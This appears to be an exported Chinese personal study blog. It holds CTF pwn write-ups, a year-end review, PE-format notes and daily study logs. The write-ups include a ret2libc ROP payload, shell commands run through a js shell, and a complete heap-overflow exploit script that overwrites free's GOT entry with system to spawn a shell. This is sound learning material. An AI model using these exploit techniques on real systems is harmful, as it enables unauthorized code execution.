class="keyword">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p>
<p>主要学到了这个方法：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br></pre></td></tr></table></figure><br>将接收到的数字左对齐，并用’\00’填充为8位，</p>
<p>参考：<a href="https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89" target="_blank" rel="noopener">https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89</a></p>
<h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>考察js shell<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~<span class="regexp">/Desktop$ nc 220.249.52.133 56451</span></span><br><span class="line"><span class="regexp">js&gt; os.system("pwd")</span></span><br><span class="line"><span class="regexp">os.system("pwd")</span></span><br><span class="line"><span class="regexp">/</span>home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">"ls"</span>)</span><br><span class="line">os.system(<span class="string">"ls"</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">"cat flag"</span>)</span><br><span class="line">os.system(<span class="string">"cat flag"</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2020总结以及2021的flag</title>
    <url>/3919.html</url>
    <content><![CDATA[<p>昨天00：40睡到了11：00…<br><a id="more"></a></p>
<h2 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h2><p>课内学的好水…无论大一下的网课还是大二上在学校上的，跟考研直接相关的数据结构学的还行，概率论就比较差了。<br>本来以为以后不会跟电路打交道，于是几节关键的数电网课就没听（后面就听不懂了），前段时间了解iot安全和计组后发现跟电路的关联还是比较大的，特别是iot的硬件方向。也许我某一天也会有点懊恼没认真听大物和离散？终究是路走窄了23333   </p>
<p>实验室方向方面，算是看完了《逆向工程核心原理》《加密与解密》《程序员的自我修养》。三本书都还是处于常看常新的状态（尤其是前两本，看的时候一知半解，现在估计也忘了好多…）。<br>今年学的还是太慢了，特别是上半年。上回在知乎上看到龙佬大二上的某个提问（学了《逆向》《加密》《python》《cppp》《0day2》）麻了。作为还能苟活在实验室而没有被踢掉的菜鸡，诚惶诚恐。<br>ctf-wiki上学到了heap，配合别人写的guidance看了一点malloc.c源码<br>感觉现在好像对底层的实现更有兴趣，比如bios、操作系统、编译原理、各种引擎、通信协议、汇编，which 完全不是 child dream 和去年学计算机的原因嘛23333…<br>搭了个ctf平台用于纳新，算是用过了xshell和docker（再次大言不惭），熟悉了od和ida还有linux、vim的简单用法和命令。<br>除了专业知识外，感觉对安全的领域和路了解太少了。</p>
<p>课外的话，在Trump和COVID-19的合作摧毁了公知和美分的谎言后，开始以其他角度，（或许更全面的）认识某些事情，有了一点政治、经济的常识（大言不惭），当然依旧羡慕Donald那种能表达为语言和文字的能力和积累。<br>看了一点《千年金融史》（真·一点）</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>当了个安全组组长，经历了协会纳新、小组考核、开会等，感觉有空可以开一篇记一下个中感受</li>
<li>（好像…又再次坚定要考研也是在今年哎，冲！）</li>
<li>报了三个ctf比赛（湖湘杯，X-NUCA,校赛），湖湘杯忘了参加，X-NUCA啥都不会，只会校赛。虽然校赛贼水，但也算是参加过了个ctf，算是感受了比赛的过程。</li>
<li>上半年在家的时候，在网上教一个人学c，并浪费了好多时间，后来第一次产生”后悔遇到某人”的愤懑</li>
<li>依然没有对哪个妹子产生过想要追的感觉，有时候觉得现在的日常安排挺充实的，为啥要多一个人出来干扰（…），毕竟连买/白嫖了的游戏都没时间玩（…)</li>
<li>入门了网球</li>
<li>过了科二，快要拿到驾照了（是没啥能写的 所以来凑数了吗）</li>
</ul>
<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》，（去年立的“看三本书”的flag果然没有达成，今年就更具体一点好了…）</li>
<li>背完考研单词</li>
<li>复习高数</li>
<li>看x86汇编、从龙佬那嫖来的glibc内存管理、csapp、操作系统、0day2、漏洞战争</li>
<li>打几个ctf</li>
<li>早睡（…)</li>
<li>坚持锻炼，特指开始jogging</li>
<li>去西北或东欧旅游（如果能的话…这是去年的flag了）</li>
<li>继续买基金（12月底因为懒得经常看，把手上的基本都卖了…</li>
</ul>
<p>over！</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.07.06-2020.07.12</title>
    <url>/36664.html</url>
    <content><![CDATA[<h2 id="MS-DOS头部"><a href="#MS-DOS头部" class="headerlink" title="MS-DOS头部"></a>MS-DOS头部</h2><p>每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行体，然后运行MZ header的DOS stub（dos块）。DOS stub是一个有效的exe，大多数情况下由编译器或汇编器自动生成。通常把DOS MZ头和DOS stub合称为DOS文件头。<br>PE文件的第一个字节位于MS-DOS头部，称作IMAGE_DOS_HEADER，其中有两个字段：e_magic和e_lfanew。<br><a id="more"></a></p>
<ul>
<li><p>e_magic的值被设为5A4Dh,ASCII值为MZ  </p>
</li>
<li><p>e_lfanew指出真正的PE文件头的相对偏移位置，占4字节，在文件开始偏移3Ch字节处。</p>
</li>
</ul>
<h2 id="PE文件头部"><a href="#PE文件头部" class="headerlink" title="PE文件头部"></a>PE文件头部</h2><p>紧接着DOS stub的是PE文件头。PE文件头是PE相关结构NT映像头的简称，其中包含许多PE装载器能用到的重要字段。当执行体在支持PE文件结构的操作系统中执行是，PE装载器将从IMAGE_DOS_HADER结构的e_lfanew字段中找到PE文件头的起始偏移量，加上基址就得到PE文件头的指针。<br>IMAGE_DOS_HEADER有两个版本，一个是为32位（PE32）可执行文件准备的,另一个是64位（PE32+）的，两个几乎没有区别。<br>IMAGE_DOS_HEADER中有3个字段：</p>
<h3 id="Signature字段"><a href="#Signature字段" class="headerlink" title="Signature字段"></a>Signature字段</h3><p>在一个有效的PE文件里，Signature字段被设置为0x00004550，对应ASCII字符为PE00<br>MS-DOS头部的e_lfanew正是指向这个字段</p>
<h3 id="FileHeader字段"><a href="#FileHeader字段" class="headerlink" title="FileHeader字段"></a>FileHeader字段</h3><p>IMAGE_FILE_HEADER（映像头文件）结构包含PE文件的一些基本信息和这个结构的大小。<br>结构的各个字段包括：  </p>
<ol>
<li>Machine：可执行文件的目标cpu类型</li>
<li>NumberOfSection：区块的数目</li>
<li>TimeDateStamp：文件创建时间</li>
<li>PointerToSymbolTable：COFF符号表的文件偏移位置</li>
<li>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，可以用来找到COFF符号表的结束处</li>
<li><p>SizeOfOptionalHeader：表示数据的大小，依赖于文件是32位还是64位</p>
</li>
<li><p>Characteristics：文件属性，定义域winnt.h内的IMAGE_FILE_xxx值</p>
</li>
</ol>
<h3 id="OptionalHeader字段"><a href="#OptionalHeader字段" class="headerlink" title="OptionalHeader字段"></a>OptionalHeader字段</h3><p>定义PE文件的其他属性</p>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMsx29.png" alt="UMsx29.png"><br><img src="https://s1.ax1x.com/2020/07/10/UMszvR.png" alt="UMszvR.png"></p>
<h3 id="区块表"><a href="#区块表" class="headerlink" title="区块表"></a>区块表</h3><p>区块表是一个IMAGE_SECTION_HEADER结构数组，每个区块表结构包含了它所关联的区块的信息，例如位置、长度等，数组的数目由IMAGE_NT_HEADERS.FileHeader.NumberOfSection指出。   </p>
<h3 id="常见区块与区块合并"><a href="#常见区块与区块合并" class="headerlink" title="常见区块与区块合并"></a>常见区块与区块合并</h3><p>链接器能够合并区块，优点是节省空间。每个区块至少占用一个内存页，将两个区块合并就有可能少用一个内存页。<br>部分在载入内存时由Windows加载器写入的输入数据可能会被放入只读区块，因为在加载时，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复为原来的属性</p>
<h3 id="区块对齐值"><a href="#区块对齐值" class="headerlink" title="区块对齐值"></a>区块对齐值</h3><p>区块有两种对齐值，一种用于磁盘文件内，一种用于内存，两者可以不同。<br>PE文件头里的FileAlignment定义了<em>磁盘区块</em>的对齐值。在不足的地方（区块间隙）用00h填充<br>PE文件头里的SectionAlignment定义了<em>内存区块</em>的对齐值。当PE文件被映射到内存中时，区块总是至少从一个页边界处开始，即每个区块的第一个字节对应于某个内存页。<br>建立一个区块在文件中的偏移和内存中的偏移相同的PE文件，可以提高载入速度并使文件变大</p>
<h3 id="文件偏移与虚拟地址的转换"><a href="#文件偏移与虚拟地址的转换" class="headerlink" title="文件偏移与虚拟地址的转换"></a>文件偏移与虚拟地址的转换</h3><p>对于磁盘对齐值和内存页不同的区块，同一数据在磁盘文件中的偏移和在内存中的偏移不同，需要进行转换。<br><img src="https://s1.ax1x.com/2020/07/15/U010qs.png" alt="U010qs.png"><br>文件被映射到内存中时，MS-DOS头部、PE文件头和块表的偏移位置和大小没有变化，而各区块被映射到内存后偏移位置发生变化</p>
<h2 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h2><p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，加载器的工作之一就是定位所有被输入的函数和数据，并让文件可以使用那些地址。这个过程通过PE文件的输入表Import Table完成。输入表中保存的是函数名和其驻留的DLL名等动态链接所需的信息。   </p>
<h3 id="输入函数的调用"><a href="#输入函数的调用" class="headerlink" title="输入函数的调用"></a>输入函数的调用</h3><p>输入函数被程序调用，但执行代码不在程序中。这些函数的代码位于相关的DLL文件中，在程序中只保留函数信息如函数名、DLL文件名等。磁盘上的PE文件无法得知这些输入函数在内存中的地址，只有当载入内存后，加载器才将相关DLL载入，并将函数地址和调用的指令联系起来   </p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>大一暑假日常</title>
    <url>/31605.html</url>
    <content><![CDATA[<h2 id="8-8"><a href="#8-8" class="headerlink" title="8-8"></a>8-8</h2><p>上周在做moectf，被新生赛弄自闭了（</p>
<p>加密与解密</p>
<h2 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h2><p>7-31没学所以没写…<br>写了七题moectf，两题re，三题web，一题pwn，一题经典密码<br>pwn写的感觉自己很瓜，有个叫backdoor的函数名硬是看了半个小时没看到…<br><a id="more"></a></p>
<h2 id="7-29、7-30"><a href="#7-29、7-30" class="headerlink" title="7-29、7-30"></a>7-29、7-30</h2><p>7-29：早上看了点数据结构-树，下午坐动车，在车上看了《程》第六章前三节（然后就睡着了…，晚上啥也没干，日报也没写:)<br>7-30：写了一题pwn，两题re</p>
<p><a href="/2827.html">材料</a></p>
<h2 id="7-28"><a href="#7-28" class="headerlink" title="7-28"></a>7-28</h2><p>昨天晚上以为把昨天的上传掉了，结果早上彦林哥问起来的时候发现并没有弄上…下午发现因为昨天那篇用了大括号，hexo g的时候报错了（然后没有注意到就hexo d了）<br>大括号嵌套使用的时候要加上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% raw %&#125;内容&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><br>好像其他括号啥的直接嵌套着用也会报错，不过还没有遇到</p>
<ol>
<li>数据结构看了串和树的开头</li>
<li>写了一题pwnable.kr上的题</li>
</ol>
<p>本来想写个攻防世界上的”guess_num“，结果场景加载不出来</p>
<p><a href="/53130.html">材料</a></p>
<h2 id="7-27"><a href="#7-27" class="headerlink" title="7-27"></a>7-27</h2><p>看了点数据结构，本来想写一题pwn题，结果pwntools突然用不了（可能是之前删了一些文件），安装pwndbg也不知道有没有弄上…就没写了<br>早上kali网络连不上，虚拟机上弄了半个小时没好，物理机的网络重新连接一下又好了…<br>打算这几天写掉这两题   </p>
<ol>
<li><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5057&amp;page=1" target="_blank" rel="noopener">guess_num</a>     </li>
<li>passcode:ssh passcode@pwnable.kr -p2222 (pw:guest)</li>
</ol>
<p><a href="/52170.html">材料(笔记)</a></p>
<h2 id="7-24"><a href="#7-24" class="headerlink" title="7-24"></a>7-24</h2><ol>
<li>一题pwn。有思路，但是有个地方不知道怎么实现，看了别人的exp知道怎么写了，不过有些地方还不是很懂</li>
<li>《逆向工程核心原理》第四章</li>
</ol>
<p><a href="/51850.html">材料</a></p>
<h2 id="7-23"><a href="#7-23" class="headerlink" title="7-23"></a>7-23</h2><ol>
<li>写了一题攻防世界的pwn题:<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5051&amp;page=1" target="_blank" rel="noopener">when_did_you_born</a>，看了一题<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5057&amp;page=1" target="_blank" rel="noopener">guess_num</a>，还没写出来（应该是不会了…）    </li>
<li>看了点数据结构的堆栈  部分 </li>
</ol>
<p>写题花了比较久，差不多是看了三题发现一题会写，一题思路错了，一题根本没思路….<br><a href="/64573.html">材料</a></p>
<h2 id="7-22"><a href="#7-22" class="headerlink" title="7-22"></a>7-22</h2><p>今天有半天在动车上…</p>
<ol>
<li>攻防世界上写了一题pwn：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5053&amp;page=1" target="_blank" rel="noopener">level0</a></li>
<li>《程》第四章第一节到第四节</li>
</ol>
<p>打算以后十一点半后不看手机电脑了:(<br>好像也没啥材料写…</p>
<h2 id="7-21"><a href="#7-21" class="headerlink" title="7-21"></a>7-21</h2><p>昨天（周一）把《程》第三章看完，感觉没啥好写的（其实是晚上十一点才想起来就懒得写了…）   </p>
<ol>
<li>发现上回把pwntools装上了（之前以为没装成），就在pwnable.kr上写了两题，攻防世界写了一题pwn。emmm看的题比写的多一点</li>
<li>看了《逆向工程核心原理》的第二章。分析了“hello world”程序，讲了两种修改输出字符串的方法。没啥想法。</li>
</ol>
<p>感觉最近越来越懒了…一直看电脑导致眼睛也有点不舒服…<br>不想看PDF，想买书了orz<br><a href="/14532.html">今天的材料</a></p>
<h2 id="7-17"><a href="#7-17" class="headerlink" title="7-17"></a>7-17</h2><ol>
<li>把数据结构数组的部分跳过了，看了一些堆栈的   </li>
<li>写了个<a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5081&amp;page=1" target="_blank" rel="noopener">攻防世界上的re题</a> (以及九道非常入门的web题…)   </li>
</ol>
<p><a href="/12344.html">今天的材料</a>   </p>
<h2 id="7-16"><a href="#7-16" class="headerlink" title="7-16"></a>7-16</h2><ol>
<li>看了点数组（对称矩阵的压缩存储）。感觉各种存储结构好复杂…明天再查点资料  </li>
<li>把昨天那题剩下的部分看完了 </li>
</ol>
<p><a href="/13445.html">今天的材料</a></p>
<h2 id="7-15"><a href="#7-15" class="headerlink" title="7-15"></a>7-15</h2><ol>
<li>《程》第三章第三节</li>
<li>数据结构线性表的两个应用举例。一个是链式存储一元多项式的和，这个之前在mooc上看过，没啥感觉；另一个打印文本文件最后n行，链表的部分懂了，argc、*argv[]和通过命令行输入参数不是很懂….</li>
<li>把彦林学长上回给的一题逆向题再看了一点，就汇编代码对照着伪代码理解了一下</li>
</ol>
<p><a href="/64075.html">这个是有关材料</a></p>
<h2 id="7-14"><a href="#7-14" class="headerlink" title="7-14"></a>7-14</h2><p>今天跟昨天差不多，早上有点事，下午去驾校，（晚上打lol），学的很少…   </p>
<ol>
<li>《程》第三章，（本来以为能把这章看完，但事实上并没有….）就看了前两节。跟《加密与解密》十一章（PE）有点关系，就多了个ELF文件，感觉这个讲的更细一些，也对之前看的加密与解密更理解了（大概吧）</li>
<li>双向循环链表和非循环链表。把指针设为llink和rlink，其它好像不是特别难（….）。这章还剩下应用举例没看，感觉好像有点复杂Orz</li>
</ol>
<h2 id="7-13"><a href="#7-13" class="headerlink" title="7-13"></a>7-13</h2><p>（今天好像没干啥，早上有点事，下午去驾校挂科二时长的时候才开始看点书）    </p>
<ol>
<li>看了点线性链表，感觉基本跟上学期学的没啥差别，就再多了逆转、合并、排序，感觉挺巧妙的但不难</li>
<li>《程序员的自我修养》看完了第二章，上周第一章“回顾大家所了解的”看得瑟瑟发抖。这章了解了一些预处理、编译、汇编和链接的大致过程，还有静态语言、动态语言、静态链接、动态链接的区别。emmm写编译器真是太难了….</li>
</ol>
]]></content>
      <tags>
        <tag>日报</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfwiki堆漏洞整理</title>
    <url>/29281.html</url>
    <content><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上<br><a id="more"></a></p>
<p><strong>利用策略</strong>：</p>
<ul>
<li>1.覆盖下一个chunk的内容</li>
<li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li>
</ul>
<h2 id="几个重要步骤"><a href="#几个重要步骤" class="headerlink" title="几个重要步骤"></a>几个重要步骤</h2><ol>
<li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li>
<li>寻找危险函数（输入输出、字符串操作）</li>
<li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li>
</ol>
<h2 id="Off-By-One-堆"><a href="#Off-By-One-堆" class="headerlink" title="Off-By-One(堆)"></a>Off-By-One(堆)</h2><p>指溢出了一个字节（单字节缓冲区溢出）</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li>
<li>使prev_in_use位清零，这时前块会被认为是空闲的<ol>
<li>unlink</li>
<li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li>
</ol>
</li>
</ol>
<h3 id="b00k"><a href="#b00k" class="headerlink" title="b00k"></a>b00k</h3><p>然后运行一下看看程序的运行，再进ida，函数名已经把功能写的很清楚了：<br>main函数：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png" alt="20210309165145"></p>
<p>发现每次读入都是调用这个函数：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png" alt="20210309165416"><br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png" alt="20210309165312"><br>而仔细想想这个函数，发现当长度为32时，刚好能把结束符覆盖到下一个字节，而程序刚开始运行输入的author_name存储的位置也真的是非常的巧妙：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png" alt="20210309165850"><br>也就是说我们能够泄露出book信息存放的地址了 </p>
<h1 id="Chunk-extend-amp-overlapping"><a href="#Chunk-extend-amp-overlapping" class="headerlink" title="Chunk extend &amp; overlapping"></a>Chunk extend &amp; overlapping</h1><p>主要是通过其他漏洞（如off by one）修改某个chunk的size，达到覆盖后面几个chunk的效果，这样就能直接修改后面chunk的内容，造成任意地址读、控制执行等   </p>
<h2 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h2><p>照例先check一波<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec heapcreator </span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/heapcreator'</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure></p>
<p>main函数：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png" alt="20210309170512"><br>create():<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png" alt="20210309170921"><br>进入create，先为heaparry中一个成员申请出一块空间，再让这块空间中的第二个位置（<em>((void *</em>)heaparray[i] + 1)）指向content的内容</p>
<p>用gdb先分配一下，create两次，大小为2，内容分别为aa和bb，可以看到分配了四个堆：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png" alt="20210309184045"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png" alt="20210309184657"><br>这里回顾一下chunk的结构：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"><br>pre_size这个字段（8字节）在p==1即前一个chunk在使用时是提供给前一个chunk使用的<br>至于为什么分配的大小都是0x21，是因为分配的时候会将申请的大小转换为实际分配的大小，64位下要是8的整数倍，0x21/8==4   </p>
<p>edit函数，19行明显可以造成溢出<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png" alt="20210309185720"><br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png" alt="20210309185824"></p>
<p>剩下两个函数都是没啥大问题的    </p>
<p>于是可以想到，构造三个chunk，然后通过第一个chunk改变第二个chunk的大小使得2、3chunk overlapping；<br>free chunk2，然后再次分配改变第三个chunk的大小和内容，使其指向free.got，接着调用show()把free的地址打印出来；<br>这时因为目标是调用system(“/bin/sh”)所以还需要劫持free的got表，而<strong>由于此时chunk2的ptr已经修改为free_got了，编辑chunk2就相当于改free_got了</strong>；<br>于是最后一步就只需要再造一个chunk，写入’/bin/sh’然后释放，就能达到getshell的目的    </p>
<p>关于加粗部分：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png" alt="20210309193527"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./heapcreator"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, payload)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Size of Heap : "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content of heap:"</span>,str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, payload)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(id))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content of heap : "</span>,str(payload))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(id)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(id))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)			</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"bbbb"</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"cccc"</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span> + <span class="string">'\x81'</span>)</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x40</span> + <span class="string">'\x08'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>) + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">"Done"</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(free_addr)</span><br><span class="line">free_sys_offset = <span class="number">-0x3f1a0</span></span><br><span class="line">sys_addr = free_addr + free_sys_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\nsys_addr:   '</span> + hex(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr)) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>对于两个释放了的物理相邻的chunk，在内存回收进行合并时会加入新的bin，此时有可能产生攻击点   </p>
<p>unlink的过程：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png" alt="20210309195222"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当我们 free() 时</span><br><span class="line">glibc 判断这个块是 small chunk</span><br><span class="line">判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</span><br><span class="line">判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</span><br><span class="line">继而对 Nextchunk 采取 unlink 操作</span><br><span class="line"></span><br><span class="line">unlink 具体执行的效果:</span><br><span class="line">FD&#x3D;P-&gt;fd &#x3D; target addr -12</span><br><span class="line">BK&#x3D;P-&gt;bk &#x3D; expect value</span><br><span class="line">FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value</span><br><span class="line">BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12</span><br></pre></td></tr></table></figure></p>
<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>主要有这两种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>
<p>关注到free后没有把指针指向NULL的代码片段</p>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>据说是很经典的UAF入门题。网上关于这个题的分析有很多了，但还有一些点是自己看了别人的wp然后想了好久才理解到的，就记录一下一些点。</p>
<p>第一次add两个node时：<br>notelist数组中的值：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png" alt="20201218132834"></p>
<p>notelist[i]指向的chunk中的内容，其中0x0804865b是print_note_content函数的地址：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png" alt="20201218133230"></p>
<p>删除两个node后：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png" alt="20201218133934"><br>可以看到chunk里的内容改变了，但是notelist数组的前两个值依然指向原来的chunk<br>（这里free的顺序出了点小问题）</p>
<p>再次add一个大小为8的node时：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png" alt="20201218134358"><br>发现原来的两个chunk分配给了新生成的node，。<br>因为上面free的顺序反了导致notelist[0]和[2]指向了相同的位置，本可以把第一个chunk的内容覆盖为system的gadget，不过…意思到了就行。</p>
<p>如果覆盖为system(…)即程序提供的magic函数，就可以print_nodelist[0],调用magic函数，获得shell</p>
